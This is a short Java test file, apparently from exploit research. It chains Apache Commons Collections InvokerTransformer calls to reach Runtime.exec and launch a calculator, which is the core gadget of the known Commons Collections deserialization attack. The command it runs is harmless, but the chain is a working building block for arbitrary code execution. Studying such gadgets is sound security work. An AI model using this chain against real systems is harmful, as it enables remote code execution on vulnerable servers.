package payload;

import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;


import java.lang.reflect.Method;


public class test3 {
    public static void main(String[] args) {
        Object first = new ConstantTransformer(Runtime.class).transform(new Class[]{});
        InvokerTransformer tran1 = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null});
        Method run = (Method) tran1.transform(first);
        InvokerTransformer tran2 = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null});
        Runtime run2 = (Runtime) tran2.transform(run);
        InvokerTransformer tran3 = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"gnome-calculator"});
        tran3.transform(run2);

    }
}
